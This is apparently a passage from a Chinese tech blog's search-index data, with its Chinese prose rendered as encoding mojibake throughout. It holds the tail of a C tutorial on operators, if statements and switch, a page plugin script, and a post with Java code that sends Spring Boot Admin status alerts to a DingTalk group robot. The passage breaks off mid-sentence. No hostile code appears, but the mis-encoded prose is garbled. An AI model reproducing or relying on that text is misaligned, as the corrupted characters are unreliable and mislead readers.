æ—¶ï¼Œæ‰èƒ½æŠŠ\'d\'èµ‹äºaï¼Œ\'e\'èµ‹äºˆbï¼Œ\'f\'èµ‹äºˆcã€‚å¦‚æœåœ¨æ ¼å¼æ§åˆ¶ä¸­åŠ å…¥ç©ºæ ¼ä½œä¸ºé—´éš”ï¼Œå¦‚ï¼šscanf("%c %c %c", &amp;a, &amp;b, &amp;c)ï¼Œåˆ™è¾“å…¥æ—¶å„æ•°æ®ä¹‹é—´å¯åŠ ç©ºæ ¼ï¼Œaã€bã€cä¹Ÿå°†ä¼šè¢«èµ‹äºˆæ­£ç¡®çš„å€¼ å…³ç³»è¿ç®—ç¬¦åŠå…¶ä¼˜å…ˆçº§å…³ç³»è¿ç®—ç¬¦éƒ½æ˜¯åŒç›®è¿ç®—ç¬¦ï¼Œå…¶ç»“åˆæ€§å‡ä¸ºå·¦ç»“åˆï¼Œåˆ†åˆ«æ˜¯ &lt;ã€&lt;=ã€&gt;ã€&gt;=ã€==ã€!=ã€‚å…³ç³»è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ä½äºç®—æœ¯è¿ç®—ç¬¦ï¼Œé«˜äºèµ‹å€¼è¿ç®—ç¬¦ã€‚åœ¨å…­ä¸ªå…³ç³»è¿ç®—ç¬¦ä¸­ï¼Œå‰å››ä¸ª &lt;ã€&lt;=ã€&gt;ã€&gt;= çš„ä¼˜å…ˆçº§ç›¸åŒï¼Œä¸”é«˜äº ==ã€!= çš„ä¼˜å…ˆçº§ã€è€Œ ==ã€!= çš„ä¼˜å…ˆçº§ç›¸åŒã€‚ å…³ç³»è¡¨è¾¾å¼ å…³ç³»è¡¨è¾¾å¼çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼šè¡¨è¾¾å¼ å…³ç³»è¿ç®—ç¬¦ è¡¨è¾¾å¼ï¼Œä¾‹å¦‚ï¼ša+b &gt; c-dã€x &gt; 3/2ã€-i-5*j == k+1ã€‚ç”±äºè¡¨è¾¾å¼ä¹Ÿå¯ä»¥åˆæ˜¯å…³ç³»è¡¨è¾¾å¼ï¼Œå› æ­¤ä¹Ÿå…è®¸å‡ºç°åµŒå¥—çš„æƒ…å†µï¼Œä¾‹å¦‚ï¼ša &gt; (b&gt;c)ã€a != (c==d) å…³ç³»è¡¨è¾¾å¼çš„å€¼æ˜¯â€ çœŸâ€ å’Œ â€œå‡â€ï¼Œåˆ†åˆ«ä½¿ç”¨ â€œ1â€ å’Œ â€œ0â€ è¡¨ç¤ºï¼Œä¾‹å¦‚ï¼š5 &gt; 0 çš„å€¼ä¸º â€œçœŸâ€ï¼Œå³ä¸º 1ï¼Œåˆå¦‚ï¼š(a=3) &gt; (b=5) ç”±äº 3 &gt; 5 ä¸æˆç«‹ï¼Œæ•…å…¶å€¼ä¸ºâ€ å‡â€ï¼Œå³ä¸º 0 é€»è¾‘è¿ç®—ç¬¦åŠå…¶ä¼˜å…ˆçº§ C è¯­è¨€ä¸­æä¾›äº†ä¸‰ç§é€»è¾‘è¿ç®—ç¬¦ï¼š&amp;&amp;ï¼ˆä¸è¿ç®—ï¼‰ã€||ï¼ˆæˆ–è¿ç®—ï¼‰ã€!ï¼ˆéè¿ç®—ï¼‰ï¼Œå…¶ä¸­ä¸è¿ç®—ç¬¦ &amp;&amp; å’Œæˆ–è¿ç®—ç¬¦ || å‡ä¸ºåŒç›®è¿ç®—ç¬¦ï¼Œå…·æœ‰å·¦ç»“åˆæ€§ã€‚éè¿ç®—ç¬¦ ! ä¸ºå•ç›®è¿ç®—ç¬¦ï¼Œå…·æœ‰å³ç»“åˆæ€§ã€‚ä¸‰ç§é€»è¾‘è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§æ˜¯å¦‚ä¸‹å›¾ï¼ˆæœ€é«˜å¤„çš„è¿ç®—ç¬¦çº§åˆ«æœ€é«˜ï¼‰ é€»è¾‘è¿ç®—çš„å€¼ä¹Ÿåˆ†ä¸º â€œçœŸâ€ å’Œ â€œå‡â€ ä¸¤ç§ï¼Œç”¨ â€œ1â€ å’Œ â€œ0 â€ æ¥è¡¨ç¤ºã€‚å…¶æ±‚å€¼è§„åˆ™å¦‚ä¸‹ï¼Œä¸è¿ç®—ç¬¦ &amp;&amp;ï¼š å‚ä¸è¿ç®—çš„ä¸¤ä¸ªé‡éƒ½ä¸ºçœŸæ—¶ï¼Œç»“æœæ‰ä¸ºçœŸï¼Œå¦åˆ™ä¸ºå‡ï¼Œä¾‹å¦‚ï¼š5&gt;0 &amp;&amp; 4&gt;2ï¼Œç”±äº 5&gt;0 ä¸ºçœŸï¼Œ4&gt;2 ä¹Ÿä¸ºçœŸï¼Œç›¸ä¸çš„ç»“æœä¹Ÿä¸ºçœŸã€‚æˆ–è¿ç®—ç¬¦ ||ï¼š å‚ä¸è¿ç®—çš„ä¸¤ä¸ªé‡åªè¦æœ‰ä¸€ä¸ªä¸ºçœŸï¼Œç»“æœå°±ä¸ºçœŸï¼Œä¸¤ä¸ªé‡éƒ½ä¸ºå‡æ—¶ï¼Œç»“æœä¸ºå‡ï¼Œä¾‹å¦‚ï¼š5&gt;0 || 5&gt;8 ç”±äº 5&gt;0 ä¸ºçœŸï¼Œç›¸æˆ–çš„ç»“æœä¹Ÿå°±ä¸ºçœŸã€‚éè¿ç®—ç¬¦ !ï¼š å‚ä¸è¿ç®—é‡ä¸ºçœŸæ—¶ï¼Œç»“æœä¸ºå‡ï¼Œå‚ä¸è¿ç®—é‡ä¸ºå‡æ—¶ï¼Œç»“æœä¸ºçœŸï¼Œä¾‹å¦‚ï¼š!(5&gt;0) çš„ç»“æœä¸ºå‡ é€»è¾‘è¡¨è¾¾å¼ é€»è¾‘è¡¨è¾¾å¼çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼šè¡¨è¾¾å¼ é€»è¾‘è¿ç®—ç¬¦ è¡¨è¾¾å¼ï¼Œå…¶ä¸­çš„è¡¨è¾¾å¼å¯ä»¥åˆæ˜¯é€»è¾‘è¡¨è¾¾å¼ï¼Œä»è€Œç»„æˆäº†åµŒå¥—çš„æƒ…å½¢ã€‚ä¾‹å¦‚ï¼š(a &amp;&amp; b) &amp;&amp; cï¼Œæ ¹æ®é€»è¾‘è¿ç®—ç¬¦çš„å·¦ç»“åˆæ€§ï¼Œä¹Ÿå¯å†™ä¸ºï¼ša &amp;&amp; b &amp;&amp; c if è¯­å¥if è¯­å¥å¯ä»¥æ„æˆåˆ†æ”¯ç»“æ„ï¼Œå®ƒæ ¹æ®ç»™å®šçš„æ¡ä»¶è¿›è¡Œåˆ¤æ–­ï¼Œä»¥å†³å®šæ‰§è¡ŒæŸä¸ªåˆ†æ”¯ç¨‹åºæ®µï¼ŒC è¯­è¨€çš„ if è¯­å¥æœ‰ä¸‰ç§åŸºæœ¬å½¢å¼ï¼š ç¬¬ä¸€ç§å½¢å¼ä¸ºï¼šif (è¡¨è¾¾å¼) è¯­å¥ï¼Œå…¶è¯­ä¹‰æ˜¯ï¼šå¦‚æœè¡¨è¾¾å¼çš„å€¼ä¸ºçœŸï¼Œåˆ™æ‰§è¡Œå…¶åçš„è¯­å¥ï¼Œå¦åˆ™ä¸æ‰§è¡Œè¯¥è¯­å¥ ç¬¬äºŒç§å½¢å¼ä¸º: if-else ç¬¬ä¸‰ç§å½¢å¼ä¸ºï¼šif-else-ifï¼Œå‰ä¸¤ç§å½¢å¼çš„ if è¯­å¥ä¸€èˆ¬éƒ½ç”¨äºä¸¤ä¸ªåˆ†æ”¯ä»¥ä¸‹çš„æƒ…å†µï¼Œå½“æœ‰å¤šä¸ªåˆ†æ”¯é€‰æ‹©æ—¶ï¼Œå¯é‡‡ç”¨ if-else-if è¯­å¥ ä½¿ç”¨ if è¯­å¥åº”æ³¨æ„çš„é—®é¢˜ ä¸ºäº†é¿å…è¿™ç§äºŒä¹‰æ€§ï¼ŒC è¯­è¨€è§„å®šï¼Œelse æ€»æ˜¯ä¸å®ƒå‰é¢æœ€è¿‘çš„ if é…å¯¹ åœ¨ if è¯­å¥ä¸­ï¼Œæ¡ä»¶åˆ¤æ–­è¡¨è¾¾å¼å¿…é¡»ç”¨æ‹¬å·æ‹¬èµ·æ¥ï¼Œåœ¨è¯­å¥ä¹‹åå¿…é¡»åŠ åˆ†å· åœ¨ if è¯­å¥çš„ä¸‰ç§å½¢å¼ä¸­ï¼Œæ‰€æœ‰çš„è¯­å¥åº”ä¸ºå•ä¸ªè¯­å¥ï¼Œå¦‚æœè¦æƒ³åœ¨æ»¡è¶³æ¡ä»¶æ—¶æ‰§è¡Œä¸€ç»„ï¼ˆå¤šä¸ªï¼‰è¯­å¥ï¼Œåˆ™å¿…é¡»æŠŠè¿™ä¸€ç»„è¯­å¥ç”¨ {} æ‹¬èµ·æ¥ç»„æˆä¸€ä¸ªå¤åˆè¯­å¥ï¼Œä½†æ˜¯åœ¨ } ä¹‹åä¸èƒ½å†åŠ åˆ†å· åœ¨ä¸‰ç§å½¢å¼çš„ if è¯­å¥ä¸­ï¼Œåœ¨ if å…³é”®å­—ä¹‹åå‡ä¸ºè¡¨è¾¾å¼ï¼Œè¯¥è¡¨è¾¾å¼é€šå¸¸æ˜¯é€»è¾‘è¡¨è¾¾å¼æˆ–å…³ç³»è¡¨è¾¾å¼ï¼Œä½†ä¹Ÿå¯ä»¥æ˜¯å…¶å®ƒè¡¨è¾¾å¼ï¼Œå¦‚èµ‹å€¼è¡¨è¾¾å¼ç­‰ï¼Œç”šè‡³ä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå˜é‡ã€‚ä¾‹å¦‚ï¼šif(a=5) è¯­å¥ã€if(b) è¯­å¥ éƒ½æ˜¯åˆæ³•çš„ï¼Œåªè¦è¡¨è¾¾å¼çš„å€¼ä¸ºé 0ï¼Œå³ä¸º â€œçœŸâ€ æ¡ä»¶è¿ç®—ç¬¦ä¸æ¡ä»¶è¡¨è¾¾å¼ æ¡ä»¶è¿ç®—ç¬¦ä¸º ? å’Œ :ï¼Œå®ƒæ˜¯ä¸€ä¸ªä¸‰ç›®è¿ç®—ç¬¦ï¼Œå³æœ‰ä¸‰ä¸ªå‚ä¸è¿ç®—çš„é‡ã€‚ç”±æ¡ä»¶è¿ç®—ç¬¦ç»„æˆæ¡ä»¶è¡¨è¾¾å¼çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼šè¡¨è¾¾å¼ 1? è¡¨è¾¾å¼ 2: è¡¨è¾¾å¼ 3ï¼Œå…¶æ±‚å€¼è§„åˆ™ä¸ºï¼šå¦‚æœè¡¨è¾¾å¼ 1 çš„å€¼ä¸ºçœŸï¼Œåˆ™ä»¥è¡¨è¾¾å¼ 2 çš„å€¼ä½œä¸ºæ¡ä»¶è¡¨è¾¾å¼çš„å€¼ï¼Œå¦åˆ™ä»¥è¡¨è¾¾å¼ 3 çš„å€¼ä½œä¸ºæ•´ä¸ªæ¡ä»¶è¡¨è¾¾å¼çš„å€¼ æ¡ä»¶è¡¨è¾¾å¼é€šå¸¸ç”¨äºèµ‹å€¼è¯­å¥ä¹‹ä¸­ï¼Œä¾‹å¦‚æ¡ä»¶è¯­å¥ï¼šif(a&gt;b) max=a; else max=b;ï¼Œå¯ç”¨æ¡ä»¶è¡¨è¾¾å¼æ”¹å†™ä¸º max=(a&gt;b)?a:b;ï¼Œæ‰§è¡Œè¯¥è¯­å¥çš„è¯­ä¹‰æ˜¯ï¼šå¦‚ a&gt;b ä¸ºçœŸï¼Œåˆ™æŠŠ a èµ‹äºˆ maxï¼Œå¦åˆ™æŠŠ b èµ‹äºˆ max æ¡ä»¶è¿ç®—ç¬¦çš„è¿ç®—ä¼˜å…ˆçº§ä½äºå…³ç³»è¿ç®—ç¬¦å’Œç®—æœ¯è¿ç®—ç¬¦ï¼Œä½†é«˜äºèµ‹å€¼ç¬¦ï¼Œå› æ­¤ max=(a&gt;b)?a:b å¯ä»¥å»æ‰æ‹¬å·è€Œå†™ä¸º max=a&gt;b?a:bã€‚æ¡ä»¶è¿ç®—ç¬¦ï¼Ÿå’Œï¼šæ˜¯ä¸€å¯¹è¿ç®—ç¬¦ï¼Œä¸èƒ½åˆ†å¼€å•ç‹¬ä½¿ç”¨ï¼Œå…¶ç»“åˆæ–¹å‘æ˜¯è‡ªå³è‡³å·¦ switch è¯­å¥ C è¯­è¨€è¿˜æä¾›äº†å¦ä¸€ç§ç”¨äºå¤šåˆ†æ”¯é€‰æ‹©çš„ switch è¯­å¥ï¼Œå…¶ä¸€èˆ¬å½¢å¼ä¸ºï¼š 1234567switch(è¡¨è¾¾å¼){ case å¸¸é‡è¡¨è¾¾å¼: è¯­å¥1; case å¸¸é‡è¡¨è¾¾å¼: è¯­å¥2; ... case å¸¸é‡è¡¨è¾¾å¼: è¯­å¥n; default: è¯­å¥n+1;} å…¶è¯­ä¹‰æ˜¯è®¡ç®—è¡¨è¾¾å¼çš„å€¼ï¼Œå¹¶é€ä¸ªä¸å…¶åçš„å¸¸é‡è¡¨è¾¾å¼å€¼ç›¸æ¯”è¾ƒï¼Œå½“è¡¨è¾¾å¼çš„å€¼ä¸æŸä¸ªå¸¸é‡è¡¨è¾¾å¼çš„å€¼ç›¸ç­‰æ—¶ï¼Œåˆ™æ‰§è¡Œå…¶åçš„è¯­å¥ï¼Œç„¶åä¸å†è¿›è¡Œåˆ¤æ–­ï¼Œç»§ç»­æ‰§è¡Œåé¢æ‰€æœ‰ caseã€default åçš„è¯­å¥ï¼ˆæ²¡æœ‰ä½¿ç”¨ break å…³é”®å­—çš„æ—¶å€™ï¼‰ åœ¨ä½¿ç”¨ switch è¯­å¥æ—¶è¿˜åº”æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š 12345i. defaultå­å¥å¯ä»¥çœç•¥ä¸ç”¨ii. åœ¨caseåçš„å„å¸¸é‡è¡¨è¾¾å¼çš„å€¼ä¸èƒ½ç›¸åŒï¼Œå¦åˆ™ä¼šå‡ºç°é”™è¯¯iii. åœ¨caseåï¼Œå…è®¸æœ‰å¤šä¸ªè¯­å¥ï¼Œå¯ä»¥ä¸ç”¨{}æ‹¬èµ·æ¥ï¼Œä½†å»ºè®®ä½¿ç”¨{}æ‹¬èµ·æ¥iiii. å„caseå’Œdefaultå­å¥çš„å…ˆåé¡ºåºå¯ä»¥å˜åŠ¨ï¼Œè€Œä¸ä¼šå½±å“ç¨‹åºæ‰§è¡Œç»“æœ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"cè¯­è¨€"},{title:"Spring Boot Admin é›†æˆé’‰é’‰ç¾¤æœºå™¨äººæŠ¥è­¦é€šçŸ¥",url:"/posts/e728f445.html",text:'å‰è¨€å®ç°æµç¨‹åˆ›å»ºé’‰é’‰ç¾¤æœºå™¨äººåï¼Œå¾—åˆ° Webhook ä¸ Secretã€‚Java ä»£ç  å®ç° Admin çš„ Notifier æ¥å£ï¼Œå½“ç›‘å¬åˆ° Admin æœåŠ¡çŠ¶æ€å˜æ›´åï¼Œç›´æ¥è°ƒç”¨ Webhook å‘é€æ¶ˆæ¯ç»™é’‰é’‰ç¾¤æœºå™¨äººï¼Œç¾¤æˆå‘˜å°±å¯ä»¥æ”¶åˆ°æŠ¥è­¦æ¶ˆæ¯é€šçŸ¥ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸ Github çš„ Webhook å®ç°æµç¨‹ä¸€è‡´ã€‚ é’‰é’‰å®˜æ–¹æ–‡æ¡£ é’‰é’‰å®˜æ–¹æ–‡æ¡£ - è‡ªå®šä¹‰æœºå™¨äººæ¥å…¥ é’‰é’‰å®˜æ–¹æ–‡æ¡£ - è‡ªå®šä¹‰æœºå™¨äººæ¥å…¥ç•Œé¢ å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæœ¬æ–‡ä½¿ç”¨çš„æ˜¯é’‰é’‰æä¾›çš„ è‡ªå®šä¹‰æœºå™¨äºº æ¥å£ï¼Œè€Œä¸æ˜¯ å¼€å‘ä¼ä¸šå†…éƒ¨æœºå™¨äºº æ¥å£ï¼ŒåŒæ—¶ Webhook é‡ŒåŒ…å«çš„ access_token ä¸å­˜åœ¨æœ‰æ•ˆæœŸï¼ˆæ°¸ä¹…æœ‰æ•ˆï¼‰ï¼Œå³ä¸éœ€è¦å®šæ—¶åˆ·æ–° access_tokenã€‚ åˆ›å»ºé’‰é’‰ç¾¤æœºå™¨äººé¦–å…ˆç™»å½•é’‰é’‰çš„ PC ç‰ˆï¼Œåˆ›å»ºé’‰é’‰ç¾¤æœºå™¨äººï¼Œå¾—åˆ°é’‰é’‰ç¾¤æœºå™¨äººçš„ Webhookï¼›åœ¨ç¾¤æœºå™¨äººçš„å®‰å…¨è®¾ç½®é¡µé¢ï¼Œè‹¥é€‰æ‹©åŠ ç­¾åï¼ŒåŠ ç­¾ä¸€æ ä¸‹é¢è¿˜å¯ä»¥è·å–åˆ° SEC å¼€å¤´çš„å­—ç¬¦ä¸²ï¼ˆç­¾åç§˜é’¥ï¼‰ã€‚ Admin é›†æˆé’‰é’‰ç¾¤æœºå™¨äººé€šçŸ¥Java æ ¸å¿ƒä»£ç é’‰é’‰ç¾¤æœºå™¨äººçš„é…ç½®ç±» 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import org.springframework.beans.factory.annotation.Value;import org.springframework.context.annotation.Configuration;@Configurationpublic class DingTalkConfig { /** * æ˜¯å¦å¯ç”¨é’‰é’‰ç¾¤æœºå™¨äººé€šçŸ¥ï¼ˆé»˜è®¤å¦ï¼‰ */ @Value("${notify.dingtalk.enable:false}") private boolean robotEnable; /** * é’‰é’‰ç¾¤æœºå™¨äººæ‰€ç»™URLåé¢çš„access_tokenå‚æ•°å€¼ */ @Value("${notify.dingtalk.access-token:}") private String accessToken; /** * é’‰é’‰ç¾¤æœºå™¨äººçš„ç­¾åç§˜é’¥ */ @Value("${notify.dingtalk.sign-secret:}") private String signSecret; /** * æ˜¯å¦åŠ ç­¾åï¼ˆé»˜è®¤æ˜¯ï¼‰ */ @Value("${notify.dingtalk.enable-signature:true}") private boolean enableSignature; public boolean isRobotEnable() { return robotEnable; } public String getAccessToken() { return accessToken; } public String getSignSecret() { return signSecret; } public boolean isEnableSignature() { return enableSignature; }} é’‰é’‰ç¾¤æœºå™¨äººçš„æ¶ˆæ¯ç±»å‹æšä¸¾ç±» 12345678910111213141516171819202122232425262728293031public enum DingTalkMessageType { TEXT("text", "æ–‡æœ¬æ¶ˆæ¯"), LINK("link", "é“¾æ¥æ¶ˆæ¯"), MARK_DOWN("markdown", "MarkDownæ¶ˆæ¯"), FEED_CARD("feedCard", "FeedCardæ¶ˆæ¯"), ACTION_CARD("actionCard", "ActionCardæ¶ˆæ¯"); private String value; private String name; DingTalkMessageType(String value, String name) { this.value = value; this.name = name; } public String getValue() { return value; } public String getName() { return name; }} é’‰é’‰ç¾¤æœºå™¨äººçš„å¸¸é‡ç±» 123456789public class DingTalkConstants { public static final String SERVER_URL = "https://oapi.dingtalk.com"; public static final String API_SEND_MESSAGE = SERVER_URL + "/robot/send?access_token=%s"; public static final String API_SEND_MESSAGE_SIGN = SERVER_URL + "/robot/send?access_token=%s&amp;timestamp=%s&amp;sign=%s";} é’‰é’‰ç¾¤æœºå™¨äººçš„æ¶ˆæ¯å‘é€ç±» 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118import cn.hutool.core.codec.Base64;import com.dingtalk.api.DefaultDingTalkClient;import com.dingtalk.api.DingTalkClient;import com.dingtalk.api.request.OapiRobotSendRequest;import com.monitor.notify.config.DingTalkConfig;import com.monitor.notify.constants.DingTalkConstants;import com.monitor.notify.enums.DingTalkMessageType;import com.taobao.api.TaobaoResponse;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.boot.autoconfigure.condition.ConditionalOnExpression;import org.springframework.stereotype.Component;import javax.crypto.Mac;import javax.crypto.spec.SecretKeySpec;import java.net.URLEncoder;/** * é’‰é’‰ç¾¤æœºå™¨äººæ¶ˆæ¯å‘é€&lt;br&gt; * æ¯ä¸ªé’‰é’‰ç¾¤æœºå™¨äººæ¯åˆ†é’Ÿæœ€å¤šå‘é€20æ¡ï¼Œå¦‚æœè¶…è¿‡20æ¡ï¼Œä¼šé™æµ10åˆ†é’Ÿ&lt;br&gt; * æ”¯æŒå¤šç§æ¶ˆæ¯ç±»å‹ï¼Œå‘èµ·POSTè¯·æ±‚æ—¶ï¼Œå¿…é¡»å°†å­—ç¬¦é›†ç¼–ç è®¾ç½®æˆUTF-8&lt;br&gt; */@Component@ConditionalOnExpression("${notify.dingtalk.enable:false}")public class DingTalkMessageSender { private static final Logger logger = LoggerFactory.getLogger(DingTalkMessageSender.class); private DingTalkConfig dingTalkConfig; public DingTalkMessageSender(DingTalkConfig dingTalkConfig) { this.dingTalkConfig = dingTalkConfig; } /** * å‘é€æ–‡æœ¬æ¶ˆæ¯ * * @param msgText æ¶ˆæ¯å†…å®¹ * @return */ public boolean sendTextMessage(String msgText) { String logContent = msgText.replace(" ", "").replace("\\n", ""); try { logger.info("é’‰é’‰ç¾¤æœºå™¨äººå‘é€Textæ¶ˆæ¯ï¼š {}", logContent); DingTalkClient client = new DefaultDingTalkClient(getUrl()); OapiRobotSendRequest.Text text = new OapiRobotSendRequest.Text(); text.setContent(msgText); OapiRobotSendRequest request = new OapiRobotSendRequest(); request.setMsgtype(DingTalkMessageType.TEXT.getValue()); request.setText(text); TaobaoResponse response = client.execute(request); return response.isSuccess(); } catch (Exception e) { logger.error("é’‰é’‰ç¾¤æœºå™¨äººå‘é€Textæ¶ˆæ¯å¤±è´¥ : {} : {}", logContent, e.getLocalizedMessage()); } return false; } /** * å‘é€Markdownæ¶ˆæ¯ * * @param title æ ‡é¢˜ * @param msgText æ¶ˆæ¯å†…å®¹ * @return */ public boolean sendMarkdownMessage(String title, String msgText) { String logContent = msgText.replace(" ", "").replace("\\n", ""); try { logger.info("é’‰é’‰ç¾¤æœºå™¨äººå‘é€Markdownæ¶ˆæ¯ï¼š {}", logContent); DingTalkClient client = new DefaultDingTalkClient(getUrl()); OapiRobotSendRequest.Markdown markdown = new OapiRobotSendRequest.Markdown(); markdown.setTitle(title); markdown.setText(msgText); OapiRobotSendRequest request = new OapiRobotSendRequest(); request.setMsgtype(DingTalkMessageType.MARK_DOWN.getValue()); request.setMarkdown(markdown); TaobaoResponse response = client.execute(request); return response.isSuccess(); } catch (Exception e) { logger.error("é’‰é’‰ç¾¤æœºå™¨äººå‘é€Markdownæ¶ˆæ¯å¤±è´¥ : {} : {}", logContent, e.getLocalizedMessage()); } return false; } /** * è·å–URL * * @return * @throws Exception */ private String getUrl() throws Exception { String accessToken = dingTalkConfig.getAccessToken(); if (!dingTalkConfig.isEnableSignature()) { return String.format(DingTalkConstants.API_SEND_MESSAGE, accessToken); } else { Long timestamp = System.currentTimeMillis(); String sign = getSign(timestamp, dingTalkConfig.getSignSecret()); return String.format(DingTalkConstants.API_SEND_MESSAGE_SIGN, accessToken, timestamp, sign); } } /** * è·å–ç­¾å * * @param timestamp æ—¶é—´æˆ³ * @param secret é’‰é’‰ç¾¤æœºå™¨äººçš„ç­¾åç§˜é’¥ * @return * @throws Exception */ private String getSign(Long timestamp, String secret) throws Exception { String stringToSign = timestamp + "\\n" + secret; Mac mac = Mac.getInstance("HmacSHA256"); mac.init(new SecretKeySpec(secret.getBytes("UTF-8"), "HmacSHA256")); byte[] signData = mac.doFinal(stringToSign.getBytes("UTF-8")); return URLEncoder.encode(new String(Base64.encode(signData)), "UTF-8"); }} æ¶ˆæ¯é€šçŸ¥æ¨¡æ¿ç±» 123456789101112131415161718192021public class MessageTemplate { /** * é»˜è®¤çš„ç›‘æ§æ¶ˆæ¯æ¨¡æ¿ */ public static final String MONITOR_TEXT_TEMPLATE = "æœåŠ¡å: %sï¼ˆ%sï¼‰ \\næœåŠ¡çŠ¶æ€: %sï¼ˆ%sï¼‰ \\næœåŠ¡ IP: %s \\nå‘é€æ—¶é—´: %s"; /** * é’‰é’‰ç¾¤æœºå™¨äººçš„MarkDownç›‘æ§æ¶ˆæ¯æ¨¡æ¿ */ public static final String MONITOR_MARKDOWN_TEMPLATE_DINGTALK = "**æœåŠ¡åç§°ï¼š**\\n\\n" + "%sï¼ˆ%sï¼‰\\n\\n" + "**æœåŠ¡çŠ¶æ€ï¼š**\\n\\n" + "%sï¼ˆ%sï¼‰\\n\\n" + "**æœåŠ¡IPï¼š**\\n\\n" + "%s\\n\\n" + "**å‘é€æ—¶é—´ï¼š**\\n\\n" + "%s\\n\\n";} å®ç° Admin çš„ Notifier æ¥å£æ¥æ·»åŠ é’‰é’‰ç¾¤æœºå™¨äººçš„æ¶ˆæ¯é€šçŸ¥ï¼Œè‹¥éœ€è¦ç›‘å¬æœåŠ¡çš„æ‰€æœ‰äº‹ä»¶å˜æ›´ï¼Œè¿˜å¯ä»¥æ”¹ä¸ºç»§æ‰¿ AbstractEventNotifier ç±» 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import de.codecentric.boot.admin.server.domain.entities.Instance;import de.codecentric.boot.admin.server.domain.entities.InstanceRepository;import de.codecentric.boot.admin.server.domain.events.InstanceEvent;import de.codecentric.boot.admin.server.domain.events.InstanceStatusChangedEvent;import de.codecentric.boot.admin.server.notify.AbstractStatusChangeNotifier;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import reactor.core.publisher.Mono;public abstract class CustomNotifier extends AbstractStatusChangeNotifier { private Logger logger = LoggerFactory.getLogger(CustomNotifier.class); protected CustomNotifier(InstanceRepository repository) { super(repository); } @Override protected Mono&lt;Void&gt; doNotify(InstanceEvent event, Instance instance) { return Mono.fromRunnable(() -&gt; { if (event instanceof InstanceStatusChangedEvent) { logger.info("Instance {} ({}) is {}", instance.getRegistration().getName(), event.getInstance(), ((InstanceStatusChangedEvent) event).getStatusInfo().getStatus()); String status = ((InstanceStatusChangedEvent) event).getStatusInfo().getStatus(); switch (status) { // å¥åº·æ£€æŸ¥æ²¡é€šè¿‡ case "DOWN": sendMessage(event, instance, "å¥åº·æ£€æŸ¥æ²¡é€šè¿‡"); break; // æœåŠ¡ä¸‹çº¿ case "OFFLINE": sendMessage(event, instance, "æœåŠ¡ä¸‹çº¿"); break; // æœåŠ¡ä¸Šçº¿ case "UP": sendMessage(event, instance, "æœåŠ¡ä¸Šçº¿"); break; // æœåŠ¡æœªçŸ¥çŠ¶æ€ case "UNKNOWN": sendMessage(event, instance, "æœåŠ¡å‡ºç°æœªçŸ¥çŠ¶æ€"); break; default: break; } } else { logger.info("Instance {} ({}) {}", instance.getRegistration().getName(), event.getInstance(), event.getType()); } }); } public abstract void sendMessage(InstanceEvent event, Instance instance, String content);} Admin çš„æœåŠ¡çŠ¶æ€å˜æ›´é’‰é’‰ç¾¤æœºå™¨äººé€šçŸ¥å®ç°ç±» 12345678910111213141516171819202122232425262728293031323334353637383940414243import cn.hutool.core.date.DatePattern;import cn.hutool.core.date.DateUtil;import com.monitor.notify.message.DingTalkMessageSender;import com.monitor.notify.template.MessageTemplate;import de.codecentric.boot.admin.server.domain.entities.Instance;import de.codecentric.boot.admin.server.domain.entities.InstanceRepository;import de.codecentric.boot.admin.server.domain.events.InstanceEvent;import de.codecentric.boot.admin.server.domain.events.InstanceStatusChangedEvent;import org.springframework.boot.autoconfigure.condition.ConditionalOnExpression;import org.springframework.stereotype.Component;import java.util.Date;@Component@ConditionalOnExpression("${notify.dingtalk.enable:false}")public class DingtalkNotifier extends CustomNotifier { private DingTalkMessageSender messageSender; protected DingtalkNotifier(InstanceRepository repository, DingTalkMessageSender messageSender) { super(repository); this.messageSender = messageSender; } /** * å‘é€é’‰é’‰ç¾¤æœºå™¨äººæ¶ˆæ¯ * * @param event * @param instance * @param content */ @Override public void sendMessage(InstanceEvent event, Instance instance, String content) { String instanceName = instance.getRegistration().getName(); String instanceId = event.getInstance().toString(); String status = ((InstanceStatusChangedEvent) event).getStatusInfo().getStatus(); String serviceUrl = instance.getRegistration().getServiceUrl(); String dateTime = DateUtil.format(new Date(), DatePattern.NORM_DATETIME_MS_PATTERN); String message = String.format(MessageTemplate.MONITOR_MARKDOWN_TEMPLATE_DINGTALK, instanceName, instanceId, status, content, serviceUrl, dateTime); this.messageSender.sendMarkdownMessage("ç›‘æ§æ¶ˆæ¯", message); }} YML é…ç½®å†…å®¹123456notify: dingtalk: enable: true access-token: xxxxxxxxxxx sign-secret: SECxxxxxxxxxxx enable-signature: true é’‰é’‰çš„ Java SDKç”±äºé’‰é’‰å®˜æ–¹æ²¡æœ‰å°†é’‰é’‰çš„ SDK å‘å¸ƒåˆ° Maven ä»“åº“ï¼Œå› æ­¤éœ€è¦åœ¨é’‰é’‰å®˜ç½‘æ‰‹åŠ¨ä¸‹è½½æœ€æ–°ç‰ˆçš„ SDKï¼Œç„¶åå‘å¸ƒåˆ° Maven ç§æœ‰ä»“åº“ï¼Œæˆ–è€…å®‰è£…åœ¨æœ¬åœ°çš„ Maven ä»“åº“ï¼Œæœ€ååœ¨é¡¹ç›®çš„ 